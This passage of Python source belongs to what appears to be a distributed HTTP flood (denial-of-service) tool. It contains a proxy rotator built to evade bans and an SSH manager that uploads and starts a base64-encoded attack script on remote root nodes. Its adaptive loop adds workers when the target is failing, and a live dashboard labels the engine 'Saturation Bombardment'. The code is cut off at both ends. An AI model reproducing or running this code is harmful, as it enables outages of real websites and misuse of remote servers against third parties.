            "footer": footer,
            "proxies": proxies,
            "activity": activity,
            "events": events,
            "nodes": 0,
        }

        remaining = max(0, total_rows - total())
        if remaining >= 2:
            budgets["nodes"] = remaining

        return budgets

    def render(self, force=False):
        if not self.enabled or not self._active:
            return

        now = time.monotonic()

        interval = self._RENDER_INTERVAL
        if self._last_rps > 20000:
            interval = self._RENDER_INTERVAL_VERY_HEAVY
        elif self._last_rps > 5000:
            interval = self._RENDER_INTERVAL_HEAVY

        if not force and (now - self.last_render) < interval:
            return
        self.last_render = now

        if getattr(self, "_rendering", False):
            return
        self._rendering = True

        try:
            term_cols, term_rows = self._term_size()
            max_total_lines = max(10, term_rows - 1)

            elapsed = now - self.start_time
            if elapsed < 0 or elapsed != elapsed:
                elapsed = 0.0
            remaining = max(0.0, self.duration - elapsed)
            if remaining > 86400 * 30:
                remaining = 0.0

            budgets = self._allocate_budgets(max_total_lines)

            header_lines = self._sec_header(budgets["header"])
            attack_lines = self._sec_attack(budgets["attack"], elapsed, remaining)
            node_lines = self._sec_nodes(budgets["nodes"], elapsed)
            event_lines = self._sec_events(budgets["events"])
            proxy_lines = self._sec_proxies(budgets["proxies"])
            activity_lines = self._sec_activity(budgets["activity"])
            footer_lines = self._sec_footer(budgets["footer"])

            all_lines = (header_lines + attack_lines +
                         event_lines + node_lines +
                         proxy_lines + activity_lines +
                         footer_lines)

            if len(all_lines) > max_total_lines:
                all_lines = all_lines[:max_total_lines]

            buf = ["\033[H"]
            num_lines = len(all_lines)
            for i, line in enumerate(all_lines):
                buf.append(line)
                buf.append("\033[K")
                if i < num_lines - 1:
                    buf.append("\n")
            buf.append("\033[J")

            sys.stdout.write("".join(buf))
            sys.stdout.flush()

        except Exception:
            pass
        finally:
            self._rendering = False


LIVE_DASHBOARD = LiveDashboard()

_LOG_THROTTLE = {}
_LOG_THROTTLE_SEC = 3
_LOG_SUPPRESSED = {}


def log_event(status_type: str, message: str):
    if LIVE_DASHBOARD.enabled:
        LIVE_DASHBOARD.push_log(status_type, message)
        if status_type == "200":
            LIVE_DASHBOARD.add_event("200 OK")
        elif status_type == "TIMEOUT":
            LIVE_DASHBOARD.add_event("Timeout")
        elif status_type == "403":
            LIVE_DASHBOARD.add_event("403 Blocked")
        elif status_type == "429":
            LIVE_DASHBOARD.add_event("429 Rate-Limited")
        elif status_type == "FAIL":
            LIVE_DASHBOARD.add_event("Connection Fail")
        elif status_type == "OTHER":
            LIVE_DASHBOARD.add_event("Other Status")
        elif status_type.startswith("5"):
            LIVE_DASHBOARD.add_event(f"{status_type} Server Error")
        return

    timestamp = time.strftime("%H:%M:%S")

    throttle_key = None
    if status_type in ("TIMEOUT", "FAIL", "403", "429"):
        throttle_key = status_type
    elif status_type.startswith("5"):
        throttle_key = "5xx"
    elif status_type == "OTHER":
        throttle_key = "OTHER"

    if throttle_key:
        now = time.time()
        last = _LOG_THROTTLE.get(throttle_key, 0)
        if now - last < _LOG_THROTTLE_SEC:
            _LOG_SUPPRESSED[throttle_key] = _LOG_SUPPRESSED.get(throttle_key, 0) + 1
            return
        _LOG_THROTTLE[throttle_key] = now
        suppressed = _LOG_SUPPRESSED.pop(throttle_key, 0)
        if suppressed > 0:
            message = f"{message}  {Colors.DIM}(+{suppressed} suppressed){Colors.RESET}"

    if status_type == "200":
        prefix = f"{Colors.GREEN}● 200 OK{Colors.RESET}"
    elif status_type == "429":
        prefix = f"{Colors.YELLOW}● RATE-LIMIT{Colors.RESET}"
    elif status_type == "403":
        prefix = f"{Colors.RED}● BLOCKED/BAN{Colors.RESET}"
    elif status_type.startswith("5"):
        prefix = f"{Colors.RED}● SRV-ERR {status_type}{Colors.RESET}"
    elif status_type == "TIMEOUT":
        prefix = f"{Colors.RED}{Colors.BOLD}● DEADLOCK/TO{Colors.RESET}"
    elif status_type == "PROXY":
        prefix = f"{Colors.MAGENTA}● PROXY{Colors.RESET}"
    else:
        prefix = f"{Colors.RED}● FAIL/{status_type}{Colors.RESET}"

    print(f"  {Colors.DIM}{timestamp}{Colors.RESET}  {prefix}  {message}")


def save_json_report(filename_prefix: str, data: dict):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"attack_{filename_prefix}_{timestamp}.json"
    try:
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        print(f"\n  {Colors.GREEN}✓{Colors.RESET} Battle log saved  {Colors.DIM}→{Colors.RESET} {Colors.BOLD}{filename}{Colors.RESET}")
    except Exception as e:
        print(f"\n  {Colors.RED}⚠{Colors.RESET} Failed to save log: {e}")


class ProxyManager:
    def __init__(self):
        self.all_proxies = []
        self.working_proxies = []
        self.dead_proxies = []
        self.proxy_stats = {}
        self.sessions = {}
        self.rotation_mode = "weighted"
        self.validation_url = "https://api.ipify.org?format=json"
        self.validation_timeout = 10
        self.validation_concurrency = 100
        self._rr_index = 0
        self.enabled = False
        self.conn_limit_per_proxy = 30
        self.dead_threshold = 500
        self._revive_task = None
        self._all_dead_notified = False

    def normalize_proxy(self, raw):
        raw = raw.strip()
        if not raw or raw.startswith("#"):
            return None
        if "#" in raw:
            raw = raw.split("#", 1)[0].strip()
        if not raw:
            return None
        if "://" in raw:
            return raw
        try:
            host_part = raw.split("@")[-1]
            port = int(host_part.rsplit(":", 1)[1])
            if port in (1080, 1081, 1082, 1083, 1084, 1085,
                        9050, 9051, 9150, 9151, 1088):
                return f"socks5://{raw}"
            if port in (4145, 4153):
                return f"socks4://{raw}"
            if port in (80, 443, 8080, 8081, 3128, 8118, 8888,
                        8000, 8001, 8889):
                return f"http://{raw}"
        except (ValueError, IndexError):
            pass
        return f"http://{raw}"

    def load_from_file(self, filepath):
        if not os.path.exists(filepath):
            return 0, "File not found"
        count = 0
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                p = self.normalize_proxy(line)
                if p and p not in self.all_proxies:
                    self.all_proxies.append(p)
                    count += 1
        return count, f"Loaded {count} new proxies (total: {len(self.all_proxies)})"

    def add_proxy(self, raw):
        p = self.normalize_proxy(raw)
        if not p:
            return False, "Invalid proxy format"
        if p in self.all_proxies:
            return False, "Already exists"
        self.all_proxies.append(p)
        return True, f"Added: {p}"

    def clear_all(self):
        self.all_proxies = []
        self.working_proxies = []
        self.dead_proxies = []
        self.proxy_stats = {}
        self.sessions = {}
        self.enabled = False
        self._all_dead_notified = False
        return "All proxies cleared"

    async def validate_proxy(self, proxy, timeout=None):
        timeout = timeout or self.validation_timeout
        if timeout > 15:
            timeout = 15
        start = time.perf_counter()

        ssl_ctx = ssl_lib.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl_lib.CERT_NONE

        session = None
        try:
            if not SOCKS_AVAILABLE:
                return False, 0, "aiohttp-socks missing"

            connector = ProxyConnector.from_url(
                proxy,
                limit=3,
                limit_per_host=3,
                enable_cleanup_closed=True,
                ssl=ssl_ctx,
            )
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=timeout, connect=timeout),
            )
            async with session.get(
                self.validation_url,
                timeout=aiohttp.ClientTimeout(total=timeout, connect=timeout),
                ssl=ssl_ctx,
                allow_redirects=False,
            ) as r:
                if r.status == 200:
                    await r.read()
                    latency = int((time.perf_counter() - start) * 1000)
                    return True, latency, "OK"
                try:
                    await r.read()
                except Exception:
                    pass
                return False, 0, f"HTTP {r.status}"
        except asyncio.TimeoutError:
            return False, 0, "Timeout"
        except asyncio.CancelledError:
            raise
        except Exception as e:
            return False, 0, f"{type(e).__name__}: {str(e)[:60]}"
        finally:
            if session is not None:
                try:
                    await asyncio.shield(session.close())
                except Exception:
                    pass

    async def validate_all(self):
        if not self.all_proxies:
            return 0, 0, "No proxies loaded"

        if self.validation_timeout > 15:
            self.validation_timeout = 15

        total = len(self.all_proxies)
        is_tty = sys.stdout.isatty()

        print(f"\n  {Colors.CYAN}➜ Validating {total} proxies...{Colors.RESET}\n")

        sem = asyncio.Semaphore(self.validation_concurrency)
        self.proxy_stats = {}
        self.working_proxies = []
        self.dead_proxies = []
        alive_count = [0]
        dead_count = [0]
        done_count = [0]
        lock = asyncio.Lock()

        def _progress_line():
            done = done_count[0]
            alive = alive_count[0]
            dead = dead_count[0]
            bar_len = 30
            filled = int(bar_len * done / total) if total else 0
            if filled >= bar_len:
                bar = "=" * bar_len
            else:
                bar = "=" * filled + ">" + " " * (bar_len - filled - 1)
            pct = int(done * 100 / total) if total else 0
            return (
                f"  Alive: {alive:>5}  Dead: {dead:>5}  "
                f"Progress: {done:>5}/{total}  "
                f"[{bar}]  {pct:>3}%"
            )

        if is_tty:
            sys.stdout.write(_progress_line())
            sys.stdout.flush()

        async def check(p):
            async with sem:
                try:
                    ok, latency, msg = await self.validate_proxy(p)
                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    ok, latency, msg = False, 0, f"Exc: {type(e).__name__}"

                async with lock:
                    done_count[0] += 1
                    if ok:
                        self.proxy_stats[p] = {
                            "requests": 0, "success": 0, "fails": 0,
                            "consecutive_fails": 0, "dead": False,
                            "latency_ms": latency, "last_check": time.time(),
                            "status": "alive"
                        }
                        alive_count[0] += 1
                    else:
                        dead_count[0] += 1

                    if is_tty:
                        sys.stdout.write("\r" + _progress_line())
                        sys.stdout.flush()

                return p, ok, latency, msg

        tasks = [asyncio.create_task(check(p)) for p in self.all_proxies]
        results = []
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            for t in tasks:
                if not t.done():
                    t.cancel()
            try:
                await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=5
                )
            except Exception:
                pass
            if is_tty:
                sys.stdout.write("\n")
                sys.stdout.flush()
            raise

        if is_tty:
            sys.stdout.write("\n")
            sys.stdout.flush()
        print()

        for r in results:
            if isinstance(r, Exception):
                continue
            try:
                p, ok, latency, msg = r
            except Exception:
                continue
            if ok:
                self.working_proxies.append(p)
            else:
                self.dead_proxies.append(p)

        print(f"  {Colors.BOLD}● RESULT{Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Total      "
              f"{Colors.BOLD}{total}{Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Alive      "
              f"{Colors.GREEN}{alive_count[0]}{Colors.RESET}")
        print(f"  {Colors.DIM}└─{Colors.RESET} Dead       "
              f"{Colors.RED}{dead_count[0]}{Colors.RESET}")
        print()

        return alive_count[0], dead_count[0], "Validation complete"

    async def create_sessions(self):
        for s in self.sessions.values():
            try:
                await s.close()
            except Exception:
                pass
        self.sessions = {}
        if not SOCKS_AVAILABLE:
            return 0
        created = 0
        for proxy in self.working_proxies:
            try:
                connector = ProxyConnector.from_url(
                    proxy,
                    limit=self.conn_limit_per_proxy,
                    limit_per_host=self.conn_limit_per_proxy,
                    ttl_dns_cache=300,
                    enable_cleanup_closed=True,
                )
                session = aiohttp.ClientSession(connector=connector)
                self.sessions[proxy] = session
                if proxy not in self.proxy_stats:
                    self.proxy_stats[proxy] = {
                        "requests": 0, "success": 0, "fails": 0,
                        "consecutive_fails": 0, "dead": False,
                        "latency_ms": 0, "last_check": time.time(),
                        "status": "alive"
                    }
                else:
                    self.proxy_stats[proxy]["dead"] = False
                    self.proxy_stats[proxy]["consecutive_fails"] = 0
                created += 1
            except Exception as e:
                print(f"  {Colors.RED}⚠{Colors.RESET} Session failed for {proxy}: {e}")
        self._all_dead_notified = False
        return created

    def alive_sessions(self):
        return [p for p in self.sessions.keys()
                if not self.proxy_stats.get(p, {}).get("dead", False)]

    def get_session(self):
        if not self.sessions:
            return None, None
        alive = self.alive_sessions()
        if not alive:
            return None, None

        if self.rotation_mode == "round_robin":
            self._rr_index = (self._rr_index + 1) % len(alive)
            p = alive[self._rr_index]
        elif self.rotation_mode == "weighted":
            weights = []
            for p in alive:
                lat = self.proxy_stats.get(p, {}).get("latency_ms", 1000)
                weights.append(max(1, 5000 - lat))
            p = random.choices(alive, weights=weights, k=1)[0]
        else:
            p = random.choice(alive)
        return self.sessions[p], p

    async def close_all(self):
        for s in self.sessions.values():
            try:
                await s.close()
            except Exception:
                pass
        self.sessions = {}

    def record_request(self, proxy, ok):
        stat = self.proxy_stats.get(proxy)
        if not stat:
            return
        stat["requests"] += 1
        if ok:
            stat["success"] += 1
            stat["consecutive_fails"] = 0
            if stat.get("dead", False):
                stat["dead"] = False
                if LIVE_DASHBOARD.enabled:
                    LIVE_DASHBOARD.add_event("Proxy Revived")
            self._all_dead_notified = False
        else:
            stat["fails"] += 1
            stat["consecutive_fails"] = stat.get("consecutive_fails", 0) + 1
            if stat["consecutive_fails"] >= self.dead_threshold:
                stat["dead"] = True

    async def revive_loop(self):
        while True:
            try:
                await asyncio.sleep(20)
            except asyncio.CancelledError:
                raise
            try:
                dead_list = [p for p in self.sessions.keys()
                             if self.proxy_stats.get(p, {}).get("dead", False)]
                if not dead_list:
                    continue
                for p in dead_list:
                    try:
                        ok, lat, msg = await self.validate_proxy(p, timeout=6)
                    except Exception:
                        ok = False
                    if ok:
                        st = self.proxy_stats.get(p)
                        if st:
                            st["dead"] = False
                            st["consecutive_fails"] = 0
                            st["latency_ms"] = lat
                            if LIVE_DASHBOARD.enabled:
                                LIVE_DASHBOARD.add_event("Proxy Revived")
            except asyncio.CancelledError:
                raise
            except Exception:
                pass

    async def start_reviver(self):
        if self._revive_task is None or self._revive_task.done():
            self._revive_task = asyncio.create_task(self.revive_loop())

    async def stop_reviver(self):
        if self._revive_task:
            self._revive_task.cancel()
            try:
                await self._revive_task
            except asyncio.CancelledError:
                pass
            self._revive_task = None

    def print_stats(self):
        if not self.proxy_stats:
            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} No proxy stats available. Run validation first.")
            return
        print(f"\n  {Colors.BOLD}● PROXY STATISTICS{Colors.RESET}\n")
        header = f"  {'PROXY':<48} {'REQ':>8} {'OK':>8} {'FAIL':>8} {'LAT':>8}"
        print(f"{Colors.BOLD}{header}{Colors.RESET}")
        print(f"  {Colors.DIM}{'─' * 86}{Colors.RESET}")
        for p, s in sorted(self.proxy_stats.items(), key=lambda x: -x[1]["requests"]):
            dead = s.get("dead", False)
            color = Colors.RED if dead else (Colors.GREEN if s["fails"] == 0 else (Colors.YELLOW if s["success"] > s["fails"] else Colors.RED))
            line = f"  {color}{p[:46]:<48} {s['requests']:>8} {s['success']:>8} {s['fails']:>8} {s['latency_ms']:>6}ms{Colors.RESET}"
            print(line)
        print(f"  {Colors.DIM}{'─' * 86}{Colors.RESET}")
        total_req = sum(s["requests"] for s in self.proxy_stats.values())
        total_ok = sum(s["success"] for s in self.proxy_stats.values())
        print(f"  {Colors.BOLD}●{Colors.RESET} Total:  {Colors.BOLD}{total_req}{Colors.RESET} requests  "
              f"{Colors.DIM}|{Colors.RESET}  {Colors.GREEN}{total_ok} success{Colors.RESET}  "
              f"{Colors.DIM}|{Colors.RESET}  {Colors.RED}{total_req - total_ok} fails{Colors.RESET}\n")

    def save_working(self, filepath="working_proxies.txt"):
        with open(filepath, "w") as f:
            for p in self.working_proxies:
                f.write(p + "\n")
        return filepath


PROXY_MANAGER = ProxyManager()


class NodeInfo:
    def __init__(self, ip, port=22, username="root", password=""):
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password
        self.status = "pending"
        self.error_msg = None
        self.cpu = 0.0
        self.ram = 0.0
        self.load = "0.0"
        self.client = None
        self.last_update = 0
        self.live_requests = 0
        self.live_success = 0
        self.live_timeouts = 0
        self.live_srv_err = 0
        self.live_running = False
        self._last_req_seen = 0
        self._last_req_ts = 0

    def label(self):
        return f"{self.ip}:{self.port}"

    def to_dict(self):
        return {"ip": self.ip, "port": self.port,
                "username": self.username, "password": self.password}

    @classmethod
    def from_dict(cls, d):
        return cls(d["ip"], d.get("port", 22),
                   d.get("username", "root"), d.get("password", ""))


class NodeManager:
    def __init__(self):
        self.nodes = []
        self.load_from_file()

    def find(self, ip, port):
        for n in self.nodes:
            if n.ip == ip and n.port == port:
                return n
        return None

    def add(self, ip, port, username, password):
        if self.find(ip, port):
            return False, "Already exists"
        n = NodeInfo(ip, port, username, password)
        self.nodes.append(n)
        self.save_to_file()
        return True, n

    def remove(self, node):
        if node.client:
            try: node.client.close()
            except Exception: pass
        if node in self.nodes:
            self.nodes.remove(node)
        self.save_to_file()

    def save_to_file(self):
        try:
            with open(NODES_FILE, "w") as f:
                json.dump([n.to_dict() for n in self.nodes], f, indent=2)
        except Exception:
            pass

    def load_from_file(self):
        if not os.path.exists(NODES_FILE):
            return
        try:
            with open(NODES_FILE) as f:
                for d in json.load(f):
                    self.nodes.append(NodeInfo.from_dict(d))
        except Exception:
            pass

    async def connect(self, node):
        if not PARAMIKO_AVAILABLE:
            node.status = "error"
            node.error_msg = "paramiko missing"
            return False

        if node.client is not None:
            try:
                node.client.close()
            except Exception:
                pass
            node.client = None

        def _connect():
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(
                hostname=node.ip, port=node.port,
                username=node.username, password=node.password,
                timeout=25,
                banner_timeout=30,
                auth_timeout=25,
                look_for_keys=False, allow_agent=False,
            )
            return c

        node.status = "connecting"
        last_err = None
        for attempt in range(2):
            try:
                node.client = await asyncio.to_thread(_connect)
                node.status = "connected"
                node.error_msg = None
                return True
            except paramiko.ssh_exception.SSHException as e:
                last_err = e
                err_name = type(e).__name__
                err_msg = str(e)[:70]
                if "banner" in err_msg.lower() or "session" in err_msg.lower():
                    await asyncio.sleep(1.5)
                    continue
                break
            except Exception as e:
                last_err = e
                break

        node.status = "error"
        if last_err is not None:
            msg = str(last_err)[:70] if str(last_err) else type(last_err).__name__
            node.error_msg = f"{type(last_err).__name__}: {msg}"
        else:
            node.error_msg = "unknown connection error"
        node.client = None
        return False

    async def exec_cmd(self, node, cmd, timeout=30):
        if not node.client:
            return "", "not connected"
        def _run():
            _, stdout, stderr = node.client.exec_command(cmd, timeout=timeout)
            return (stdout.read().decode(errors="ignore"),
                    stderr.read().decode(errors="ignore"))
        try:
            return await asyncio.to_thread(_run)
        except Exception as e:
            return "", str(e)

    async def check_python(self, node):
        out, _ = await self.exec_cmd(node,
            "command -v python3 >/dev/null && python3 -c 'import sys;print(sys.version_info[0])' || echo MISSING",
            timeout=10)
        return out.strip().startswith("3")

    async def upload_node_script(self, node):
        try:
            b64 = base64.b64encode(NODE_SCRIPT.encode()).decode()
        except Exception as e:
            return False, f"Encode failed: {e}"

        await self.exec_cmd(node, "> /tmp/node_attack.b64", timeout=5)

        chunk_size = 30000
        chunks = [b64[i:i + chunk_size] for i in range(0, len(b64), chunk_size)]

        for i, chunk in enumerate(chunks):
            op = ">" if i == 0 else ">>"
            cmd = f"printf '%s' '{chunk}' {op} /tmp/node_attack.b64"
            out, err = await self.exec_cmd(node, cmd, timeout=30)
            if err and "error" in err.lower():
                return False, f"Chunk {i} failed"

        out, err = await self.exec_cmd(
            node,
            "base64 -d /tmp/node_attack.b64 > /tmp/node_attack.py && chmod +x /tmp/node_attack.py && "
            "python3 -c 'import ast;ast.parse(open(\"/tmp/node_attack.py\").read())' && echo _OK_ || echo _FAIL_",
            timeout=20
        )
        if "_OK_" in out:
            return True, ""
        return False, f"Decode/parse failed: {err[:80]}"

    async def deploy(self, node):
        if not node.client:
            return False

        node.status = "deploying"
        node.error_msg = None

        if not await self.check_python(node):
            node.status = "error"
            node.error_msg = "python3 not found on node"
            return False

        ok, err = await self.upload_node_script(node)
        if not ok:
            node.status = "error"
            node.error_msg = err[:70]
            return False

        node.status = "ready"
        return True

    async def get_stats(self, node):
        if not node.client:
            return
        cmd = (
            "python3 - <<'PYEOF'\n"
            "import json\n"
            "try:\n"
            "    with open('/proc/stat') as f:\n"
            "        line = f.readline().split()\n"
            "    idle = int(line[4]); total = sum(int(x) for x in line[1:])\n"
            "    with open('/proc/meminfo') as f:\n"
            "        mem = {}\n"
            "        for l in f:\n"
            "            k, v = l.split(':')[0], l.split()[1]\n"
            "            mem[k] = int(v)\n"
            "    total_mem = mem['MemTotal']\n"
            "    avail_mem = mem.get('MemAvailable', mem['MemFree'])\n"
            "    used_mem = total_mem - avail_mem\n"
            "    with open('/proc/loadavg') as f:\n"
            "        load = f.read().split()[0]\n"
            "    print(json.dumps({\n"
            "        'cpu': round(100.0 * (1 - idle/max(total,1)), 1),\n"
            "        'ram': round(100.0 * used_mem/total_mem, 1),\n"
            "        'load': load,\n"
            "    }))\n"
            "except Exception:\n"
            "    print('{}')\n"
            "PYEOF"
        )
        out, _ = await self.exec_cmd(node, cmd, timeout=10)
        out = out.strip()
        if not out or not out.startswith("{"):
            return
        try:
            data = json.loads(out)
            node.cpu = data.get("cpu", 0.0)
            node.ram = data.get("ram", 0.0)
            node.load = data.get("load", "0.0")
            node.last_update = time.time()
        except Exception:
            pass

    async def start_attack(self, node, target, workers, duration,
                           safe_mode=False, proxies=None, rps=DEFAULT_RPS):
        if not node.client:
            return False

        await self.exec_cmd(node,
            "pkill -9 -f '[n]ode_attack.py' 2>/dev/null; sleep 1")

        await self.exec_cmd(node,
            "rm -f /tmp/node_attack_status.json "
            "/tmp/node_attack_status.json.tmp "
            "/tmp/node_attack.log /tmp/node_attack.pid /tmp/nohup.out")

        target_esc = target.replace("'", "'\\''")

        proxies_arg = ""
        if proxies:
            raw = ",".join(proxies)
            try:
                b64 = base64.b64encode(raw.encode()).decode()
                proxies_arg = f"--proxies '{b64}' "
            except Exception:
                proxies_arg = ""

        cmd = (
            f"cd /tmp && setsid nohup python3 /tmp/node_attack.py "
            f"--target '{target_esc}' --workers {workers} --duration {duration} "
            f"--rps {rps} "
            f"{proxies_arg}"
            f"> /tmp/nohup.out 2>&1 < /dev/null & "
            f"disown; echo STARTED"
        )
        await self.exec_cmd(node, cmd, timeout=10)

        best_requests = 0
        for _ in range(40):
            await asyncio.sleep(0.5)
            check_out, _ = await self.exec_cmd(
                node,
                "if [ -f /tmp/node_attack_status.json ]; then "
                "  echo -n 'OK:'; "
                "  cat /tmp/node_attack_status.json 2>/dev/null; "
                "else echo 'WAIT'; fi",
                timeout=5
            )
            if check_out.startswith("OK:"):
                try:
                    payload = check_out[3:].strip()
                    if payload.startswith("{"):
                        data = json.loads(payload.split("\n", 1)[0])
                        req = int(data.get("requests", 0))
                        if req > best_requests:
                            best_requests = req
                        if req > 0:
                            node.status = "attacking"
                            node.error_msg = None
                            return True
                except Exception:
                    pass

        log_out, _ = await self.exec_cmd(
            node,
            "echo '=== nohup.out ==='; tail -10 /tmp/nohup.out 2>/dev/null; "
            "echo '=== log ==='; tail -10 /tmp/node_attack.log 2>/dev/null; "
            "echo '=== pids ==='; ps aux | grep '[n]ode_attack' | head -3; "
            "echo '=== pid_file ==='; cat /tmp/node_attack.pid 2>/dev/null",
            timeout=8
        )
        node.error_msg = (log_out.strip()[:200] if log_out.strip()
                          else "no status file created")
        node.status = "ready"
        return False

    async def stop_attack(self, node):
        if not node.client:
            return
        await self.exec_cmd(node, "pkill -9 -f '[n]ode_attack.py' 2>/dev/null")
        if node.status == "attacking":
            node.status = "ready"

    def force_stop_attack_sync(self, node):
        if not node.client:
            return
        try:
            node.client.exec_command(
                "pkill -9 -f '[n]ode_attack.py' 2>/dev/null; echo DONE",
                timeout=5
            )
        except Exception:
            pass
        if node.status == "attacking":
            node.status = "ready"

    def force_stop_all_sync(self, nodes):
        for n in nodes:
            try:
                self.force_stop_attack_sync(n)
            except Exception:
                pass

    async def poll_attack_status(self, node):
        if not node.client:
            return {"running": False, "data": {}}

        cmd = (
            "NOW=$(date +%s); "
            "if [ -f /tmp/node_attack_status.json ]; then "
            "  MT=$(stat -c %Y /tmp/node_attack_status.json 2>/dev/null); "
            "  if [ -z \"$MT\" ]; then MT=0; fi; "
            "  AGE=$((NOW - MT)); "
            "  if [ \"$AGE\" -lt 20 ]; then echo -n 'R|'; else echo -n 'S|'; fi; "
            "  head -c 4000 /tmp/node_attack_status.json; "
            "else "
            "  echo -n 'M|{}'; "
            "fi; "
            "echo"
        )
        out, _ = await self.exec_cmd(node, cmd, timeout=8)
        result = {"running": False, "data": {}}

        if not out:
            return result

        if "|" in out:
            state, rest = out.split("|", 1)
            result["running"] = (state.strip() == "R")
            json_line = rest.strip().split("\n", 1)[0].strip()
            if json_line.startswith("{"):
                try:
                    result["data"] = json.loads(json_line)
                except Exception:
                    pass
        return result


NODE_MANAGER = NodeManager()


def raise_fd_limit():
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = min(hard, 65535) if hard != resource.RLIM_INFINITY else 65535
        if target > soft:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
            soft = target
        color = Colors.GREEN if soft >= 4096 else Colors.YELLOW
        print(f"  {color}✓{Colors.RESET} File descriptor limit: "
              f"{Colors.BOLD}{soft}{Colors.RESET} (hard: {hard})")
        if soft < 4096:
            print(f"  {Colors.YELLOW}⚠{Colors.RESET} Low FD limit — run: "
                  f"{Colors.BOLD}ulimit -n 65535{Colors.RESET} before starting")
    except Exception as e:
        print(f"  {Colors.YELLOW}⚠{Colors.RESET} Could not raise FD limit: {e}")


async def safe_mode_monitor(target_url, probe_session):
    while True:
        if SAFE_MODE.enabled and SAFE_MODE.active:
            SAFE_MODE.monitor_probes += 1
            try:
                sep = "&" if "?" in target_url else "?"
                url = f"{target_url}{sep}probe={random_string(8)}"
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Cache-Control": "no-cache",
                    "Connection": "keep-alive"
                }
                async with probe_session.get(
                    url, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=8),
                    ssl=False
                ) as r:
                    if r.status == 200:
                        await r.read()
                        if SAFE_MODE.recover(200):
                            if LIVE_DASHBOARD.enabled:
                                LIVE_DASHBOARD.add_event("Safe-Mode · Recovered")
                            else:
                                print(f"\n  {Colors.GREEN}{Colors.BOLD}● SAFE-MODE{Colors.RESET}  "
                                      f"origin recovered  {Colors.DIM}→{Colors.RESET}  "
                                      f"resuming attack\n")
                    elif r.status in ORIGIN_ERROR_CODES:
                        pass
            except (asyncio.TimeoutError, aiohttp.ClientError):
                pass
            except Exception:
                pass

            await asyncio.sleep(5)
        else:
            await asyncio.sleep(1)


ADJUST_INTERVAL = 20

async def adaptive_attack(worker_func, target_url, initial_concurrency,
                          max_concurrency, min_concurrency, duration,
                          stats, use_proxy=False, safe_mode=False,
                          rps=DEFAULT_RPS):
    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=300,
        ssl=False,
        force_close=False,
        enable_cleanup_closed=True,
    )
    async with aiohttp.ClientSession(connector=connector) as direct_session:

        if use_proxy and PROXY_MANAGER.working_proxies:
            created = await PROXY_MANAGER.create_sessions()
            PROXY_MANAGER.enabled = created > 0
            if PROXY_MANAGER.enabled:
                await PROXY_MANAGER.start_reviver()
        else:
            PROXY_MANAGER.enabled = False

        rps_limiter = RateLimiter(rps)

        tasks = []
        start_time = time.monotonic()
        end_time = start_time + duration

        SAFE_MODE.reset(enabled=safe_mode)

        monitor_task = None
        probe_session = None
        if SAFE_MODE.enabled:
            probe_connector = aiohttp.TCPConnector(limit=5, ssl=False)
            probe_session = aiohttp.ClientSession(connector=probe_connector)
            monitor_task = asyncio.create_task(
                safe_mode_monitor(target_url, probe_session)
            )

        for _ in range(initial_concurrency):
            task = asyncio.create_task(
                worker_func(direct_session, target_url, duration, stats,
                            use_proxy, SAFE_MODE, rps_limiter)
            )
            tasks.append(task)

        current_workers = initial_concurrency

        LIVE_DASHBOARD.start(
            target=target_url,
            engine="Saturation Bombardment",
            safe_mode=safe_mode,
            workers=current_workers,
            workers_min=min_concurrency,
            workers_max=max_concurrency,
            duration=duration,
            stats=stats,
            rps_limit=rps,
        )
        sys.stdout.write("\033[?25l")
        sys.stdout.flush()

        async def dashboard_loop():
            while LIVE_DASHBOARD.enabled:
                LIVE_DASHBOARD.workers = current_workers
                LIVE_DASHBOARD.render()
                await asyncio.sleep(0.5)

        dashboard_task = asyncio.create_task(dashboard_loop())

        prev_stats = {k: stats.get(k, 0) for k in
                      ["requests", "success", "rate_limit", "blocked",
                       "server_error", "timeouts", "dropped"]}

        try:
            while time.monotonic() < end_time:
                await interruptible_sleep(ADJUST_INTERVAL)
                if _INTERRUPTED[0]:
                    break
                if time.monotonic() >= end_time:
                    break

                if SAFE_MODE.enabled and SAFE_MODE.active:
                    continue

                new_stats = {k: stats.get(k, 0) for k in prev_stats}
                deltas = {k: new_stats[k] - prev_stats[k] for k in prev_stats}
                prev_stats = new_stats

                total_reqs = deltas["requests"]
                if total_reqs == 0:
                    continue

                block_rate = deltas["blocked"] / total_reqs
                limit_rate = deltas["rate_limit"] / total_reqs
                server_error_rate = deltas["server_error"] / total_reqs
                timeout_rate = deltas["timeouts"] / total_reqs
                success_rate = deltas["success"] / total_reqs

                if block_rate > 0.05 or limit_rate > 0.15:
                    new_workers = max(min_concurrency, current_workers - 50)
                    LIVE_DASHBOARD.add_adapt("Reduce · ban/limit")
                elif server_error_rate > 0.1 or timeout_rate > 0.1:
                    new_workers = min(max_concurrency, current_workers + 10)
                    LIVE_DASHBOARD.add_adapt("Increase · struggling")
                elif success_rate > 0.9 and block_rate < 0.02 and limit_rate < 0.05:
                    new_workers = min(max_concurrency, current_workers + 25)
                    LIVE_DASHBOARD.add_adapt("Increase · healthy")
                else:
                    new_workers = current_workers

                if new_workers < current_workers:
                    cancel_count = current_workers - new_workers
                    for _ in range(cancel_count):
                        if tasks:
                            t = tasks.pop()
                            t.cancel()
                    LIVE_DASHBOARD.add_workers_cancelled(cancel_count)
                    current_workers = new_workers
                elif new_workers > current_workers:
                    add_count = new_workers - current_workers
